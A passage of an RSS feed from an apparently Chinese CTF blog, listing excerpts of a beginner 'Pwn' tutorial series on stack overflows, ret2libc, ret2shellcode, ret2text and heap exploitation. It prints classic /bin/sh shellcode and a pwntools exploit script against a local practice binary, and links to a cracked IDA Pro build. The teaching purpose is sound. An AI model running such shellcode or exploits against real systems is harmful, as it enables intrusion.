&lt;p>编译参数：&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2libc</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/</link><pubDate>Sat, 28 Jun 2025 18:09:12 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)&lt;/p>
&lt;h2 id="函数调用约定和函数传参">函数调用约定和函数传参
&lt;a class="header-anchor" href="#%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a%e5%92%8c%e5%87%bd%e6%95%b0%e4%bc%a0%e5%8f%82">&lt;/a>
&lt;/h2>&lt;p>当使用 ida pro 逆向分析时，函数开头总有这么一段：&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2syscall</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2syscall/</link><pubDate>Sat, 28 Jun 2025 17:22:01 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2syscall/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>ret2syscall 是 Pwn 进阶中的一个重要概念，它允许我们通过修改返回地址来直接调用系统调用，从而实现更复杂的攻击。本文将介绍 ret2syscall 的基本原理和应用。&lt;/p>
&lt;p>C 语言中的 &lt;code>puts&lt;/code> &lt;code>read&lt;/code> &lt;code>write&lt;/code> 等函数实际上是对系统调用的封装。通过 ret2syscall，我们可以直接调用这些系统调用，而不需要依赖 libc 函数。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2shellcode 进阶</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode-%E8%BF%9B%E9%98%B6/</link><pubDate>Sat, 28 Jun 2025 16:46:27 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode-%E8%BF%9B%E9%98%B6/</guid><description>&lt;h2 id="手写-shellcode">手写 shellcode
&lt;a class="header-anchor" href="#%e6%89%8b%e5%86%99-shellcode">&lt;/a>
&lt;/h2>&lt;p>这里给出最经典的 shellcode&lt;/p>

&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5"> 5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-10">&lt;a class="lnlinks" href="#hl-0-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-11">&lt;a class="lnlinks" href="#hl-0-11">11&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">xor&lt;/span> &lt;span class="no">eax&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c1">; eax = 0
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c1">; push 0 (null terminator)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="mi">0x68732f2f&lt;/span> &lt;span class="c1">; push &amp;#34;//sh&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="mi">0x6e69622f&lt;/span> &lt;span class="c1">; push &amp;#34;/bin&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">ebx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span> &lt;span class="c1">; ebx = pointer to &amp;#34;/bin//sh&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="no">eax&lt;/span> &lt;span class="c1">; push 0 (argv[1] = NULL)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">edx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span> &lt;span class="c1">; edx = pointer to NULL
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">push&lt;/span> &lt;span class="no">ebx&lt;/span> &lt;span class="c1">; push pointer to &amp;#34;/bin//sh&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">ecx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="no">esp&lt;/span> &lt;span class="c1">; ecx = pointer to argv
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">mov&lt;/span> &lt;span class="no">al&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0xb&lt;/span> &lt;span class="c1">; syscall number for execve
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nf">int&lt;/span> &lt;span class="mi">0x80&lt;/span> &lt;span class="err">;&lt;/span> &lt;span class="no">trigger&lt;/span> &lt;span class="no">syscall&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>最经典的 Linux x86（32位）shellcode，它的作用是执行 /bin/sh（获得 shell）&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2shellcode</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</link><pubDate>Fri, 27 Jun 2025 22:49:50 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2shellcode/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>ret2shellcode 即是将程序的控制流劫持到我们构造的 shellcode 上。shellcode 是一段可以被执行的代码，通常用于执行系统命令或打开一个 shell。&lt;/p>
&lt;p>想要执行 sehllcode, shellcode 所在的内存区域必须是可执行的。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Ret2text</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/</link><pubDate>Wed, 25 Jun 2025 14:32:23 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2text/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>之前我们已经初步介绍了栈溢出和栈对齐，这一节我们将做一个巩固练习&lt;/p>
&lt;h2 id="ret2text">ret2text
&lt;a class="header-anchor" href="#ret2text">&lt;/a>
&lt;/h2>&lt;p>
&lt;a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text" title="ret2text" rel="noopener external nofollow noreferrer" target="_blank" class=" exturl">
 ret2text
 
 &lt;i class="fa fa-external-link-alt">&lt;/i>
 
&lt;/a>&lt;/p>
&lt;p>先进行安全防护检测&lt;/p>

&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5"> 5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-10">&lt;a class="lnlinks" href="#hl-0-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-11">&lt;a class="lnlinks" href="#hl-0-11">11&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ chmod +x ./ret2text &lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span> master
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;./ret2text&amp;#39;&lt;/span> 的模式已由 &lt;span class="m">0644&lt;/span> &lt;span class="o">(&lt;/span>rw-r--r--&lt;span class="o">)&lt;/span> 更改为 &lt;span class="m">0755&lt;/span> &lt;span class="o">(&lt;/span>rwxr-xr-x&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">~/P/c/p/l/u/s/r/bamboofox-ret2text ❯❯❯ pwn checksec ./ret2text &lt;span class="o">(&lt;/span>.venv&lt;span class="o">)&lt;/span> master ✱
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> &lt;span class="s1">&amp;#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Arch: i386-32-little
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RELRO: Partial RELRO
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Stack: No canary found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> NX: NX enabled
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> PIE: No PIE &lt;span class="o">(&lt;/span>0x8048000&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Stripped: No
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Debuginfo: Yes&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>ida pro 逆向&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 栈对齐</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E5%AF%B9%E9%BD%90/</link><pubDate>Tue, 24 Jun 2025 12:37:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E5%AF%B9%E9%BD%90/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>在上一节中为了成功执行 payload，我们在 exp.py 中加入了 &lt;code>ret&lt;/code> 指令，今天我们将继续深入了解栈对齐的问题。&lt;/p>
&lt;h2 id="栈对齐">栈对齐
&lt;a class="header-anchor" href="#%e6%a0%88%e5%af%b9%e9%bd%90">&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1"> 1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2"> 2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3"> 3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4"> 4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5"> 5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6"> 6&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-7">&lt;a class="lnlinks" href="#hl-0-7"> 7&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-8">&lt;a class="lnlinks" href="#hl-0-8"> 8&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-9">&lt;a class="lnlinks" href="#hl-0-9"> 9&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-10">&lt;a class="lnlinks" href="#hl-0-10">10&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-11">&lt;a class="lnlinks" href="#hl-0-11">11&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-12">&lt;a class="lnlinks" href="#hl-0-12">12&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./main&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 启动程序&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">backdoor&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x401170&lt;/span> &lt;span class="c1"># backdoor 函数的地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 0x000000000040101a : ret&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x40101a&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;a&amp;#34;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mh">0x10&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">backdoor&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 填充到 0x10 字节 + 8 字节的返回地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 发送 payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1"># 进入交互模式&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>开始调试后一直跟踪到发现卡住无法调试了&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 栈溢出初识</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</link><pubDate>Mon, 23 Jun 2025 18:30:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%9D%E8%AF%86/</guid><description>&lt;h2 id="前言">前言
&lt;a class="header-anchor" href="#%e5%89%8d%e8%a8%80">&lt;/a>
&lt;/h2>&lt;p>为什么输入一串杂乱的字符串，就能让程序崩溃？为什么输入一串特定的字符串，就能让程序执行任意代码？下面的内容将带你走进 Pwn 的世界，了解栈溢出是如何发生的，以及如何利用它来执行任意代码。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - Pwn 环境的搭建</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pwn-%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</link><pubDate>Mon, 23 Jun 2025 18:15:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---pwn-%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/</guid><description>&lt;h2 id="静态代码分析">静态代码分析
&lt;a class="header-anchor" href="#%e9%9d%99%e6%80%81%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90">&lt;/a>
&lt;/h2>&lt;h3 id="ida-pro">ida pro
&lt;a class="header-anchor" href="#ida-pro">&lt;/a>
&lt;/h3>&lt;p>
&lt;a href="https://www.52pojie.cn/thread-1970020-1-1.html" title="[Disassemblers] IDA Pro 9.0 RC1 全平台安装包 及 patch脚本" rel="noopener external nofollow noreferrer" target="_blank" class=" exturl">
 [Disassemblers] IDA Pro 9.0 RC1 全平台安装包 及 patch脚本
 
 &lt;i class="fa fa-external-link-alt">&lt;/i>
 
&lt;/a>&lt;/p>
&lt;p>安装过程不再赘述&lt;/p>
&lt;p>将要分析的二进制文件拖入 IDA Pro 中，等待分析完成。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 掌握调试器 gdb 的基本使用</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%8E%8C%E6%8F%A1%E8%B0%83%E8%AF%95%E5%99%A8-gdb-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</link><pubDate>Sun, 22 Jun 2025 16:32:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%8E%8C%E6%8F%A1%E8%B0%83%E8%AF%95%E5%99%A8-gdb-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</guid><description>&lt;h2 id="gdb">GDB
&lt;a class="header-anchor" href="#gdb">&lt;/a>
&lt;/h2>&lt;h3 id="介绍">介绍
&lt;a class="header-anchor" href="#%e4%bb%8b%e7%bb%8d">&lt;/a>
&lt;/h3>&lt;p>gdb 是 GNU Debugger 的缩写，是一个强大的调试工具，广泛用于调试 C/C++ 程序。它允许开发者在程序运行时检查变量、设置断点、单步执行代码等操作。掌握 gdb 是进行 Pwn 挑战的基础技能之一。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - x86 汇编基础</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---x86-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</link><pubDate>Sun, 22 Jun 2025 14:00:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---x86-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</guid><description>&lt;h2 id="汇编语言风格">汇编语言风格
&lt;a class="header-anchor" href="#%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e9%a3%8e%e6%a0%bc">&lt;/a>
&lt;/h2>&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>AT&amp;amp;T&lt;/th>
 &lt;th>Intel&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>寄存器前缀 &lt;code>%&lt;/code>&lt;/td>
 &lt;td>寄存器无前缀&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>立即数前缀 &lt;code>$&lt;/code>&lt;/td>
 &lt;td>立即数无前缀&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>16 进制数前缀 &lt;code>0x&lt;/code>&lt;/td>
 &lt;td>16 进制数后缀 &lt;code>h&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>源操作数在前，目标操作数在后&lt;/td>
 &lt;td>源操作数在后，目标操作数在前&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>间接寻址使用 &lt;code>(%reg)&lt;/code>&lt;/td>
 &lt;td>间接寻址使用 &lt;code>[reg]&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>间接寻址格式为 &lt;code>(%reg, %reg, scale)&lt;/code>&lt;/td>
 &lt;td>间接寻址格式为 &lt;code>[reg + reg * scale]&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>操作数大小后缀 &lt;code>b&lt;/code>、&lt;code>w&lt;/code>、&lt;code>l&lt;/code>&lt;/td>
 &lt;td>操作数大小后缀 &lt;code>byte ptr&lt;/code>、&lt;code>word ptr&lt;/code>、&lt;code>dword ptr&lt;/code>&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="寄存器">寄存器
&lt;a class="header-anchor" href="#%e5%af%84%e5%ad%98%e5%99%a8">&lt;/a>
&lt;/h2>
 &lt;blockquote>
 &lt;p>寄存器是 CPU 内部的高速存储器，用于存储临时数据和指令执行状态。&lt;/p></description></item><item><title>从零开始的 Pwn 之旅 - 深入了解 elf 文件</title><link>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3-elf-%E6%96%87%E4%BB%B6/</link><pubDate>Fri, 20 Jun 2025 22:00:00 +0800</pubDate><guid>/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3-elf-%E6%96%87%E4%BB%B6/</guid><description>&lt;h2 id="elf-文件初识">ELF 文件初识
&lt;a class="header-anchor" href="#elf-%e6%96%87%e4%bb%b6%e5%88%9d%e8%af%86">&lt;/a>
&lt;/h2>&lt;p>ELF 文件即 Linux 下的可执行文件，ELF 是 Executable and Linkable Format 的缩写。它是一个标准的二进制文件格式，用于存储可执行文件、目标代码、共享库和核心转储等。&lt;/p>
&lt;p>使用 Linux 内置命令 file 可以轻松查看文件类型：&lt;/p></description></item><item><title>House_of_BotCake</title><link>/posts/house_of_botcake/</link><pubDate>Thu, 17 Apr 2025 22:03:37 +0800</pubDate><guid>/posts/house_of_botcake/</guid><description>&lt;h2 id="利用背景">利用背景
&lt;a class="header-anchor" href="#%e5%88%a9%e7%94%a8%e8%83%8c%e6%99%af">&lt;/a>
&lt;/h2>&lt;p>自 glibc 2.29 开始加入了对 tcache 的 double free 检查, 使得之前的 tcache double free 失效&lt;/p>
&lt;h3 id="源码解读">源码解读
&lt;a class="header-anchor" href="#%e6%ba%90%e7%a0%81%e8%a7%a3%e8%af%bb">&lt;/a>
&lt;/h3>&lt;p>tcache 结构体&lt;/p>

&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt" id="hl-0-1">&lt;a class="lnlinks" href="#hl-0-1">1&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-2">&lt;a class="lnlinks" href="#hl-0-2">2&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-3">&lt;a class="lnlinks" href="#hl-0-3">3&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-4">&lt;a class="lnlinks" href="#hl-0-4">4&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-5">&lt;a class="lnlinks" href="#hl-0-5">5&lt;/a>
&lt;/span>&lt;span class="lnt" id="hl-0-6">&lt;a class="lnlinks" href="#hl-0-6">6&lt;/a>
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">tcache_entry&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">tcache_entry&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">next&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//链表指针，对应chunk中的fd字段
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="cm">/* This field exists to detect double frees. */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">tcache_perthread_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">//指向所属的tcache结构体，对应chunk中的bk字段
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="n">tcache_entry&lt;/span>&lt;span class="p">;&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>

&lt;p>tcache 被置入链表&lt;/p>

